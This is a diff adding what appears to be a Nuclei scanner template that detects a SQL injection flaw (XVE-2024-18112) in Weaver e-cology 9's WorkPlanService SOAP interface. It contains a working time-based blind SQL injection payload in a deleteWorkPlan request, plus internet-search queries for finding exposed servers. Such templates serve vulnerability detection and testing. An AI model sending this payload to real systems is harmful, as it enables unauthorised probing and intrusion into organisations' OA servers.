@@ -1,0 +1,31 @@
+id: Weaver_E-Office9_WorkPlanService_SQLi
+
+info:
+  name: Weaver_E-Office9_WorkPlanService_SQLi
+  author: HK
+  severity: high
+  description: 泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)
+  metadata:
+    max-request: 1
+    Fofa-query: app="泛微-OA（e-cology）"
+    Quake-query: app.name=="泛微 e-cology 9.0 OA"
+    Hunter-query: app:"泛微 e-Cology协同商务系统"
+    verified: true
+
+http:
+- raw:
+  - "@timeout: 30s\nPOST /services/WorkPlanService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:
+    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+    Chrome/124.0.6367.118 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\nConnection:
+    close\nContent-Length: 441\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+    xmlns:web=\"webservices.workplan.weaver.com.cn\">\n    <soapenv:Header/>\n      <soapenv:Body>\n
+    \     <web:deleteWorkPlan>\n         <!--type: string-->\n         <web:in0>(SELECT
+    1 FROM (SELECT(SLEEP(5-(IF(1=1,1,5)))))NZeo)</web:in0>\n         <!--type: int-->\n
+    \        <web:in1>22</web:in1> \n      </web:deleteWorkPlan>\n      </soapenv:Body>\n</soapenv:Envelope>"
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
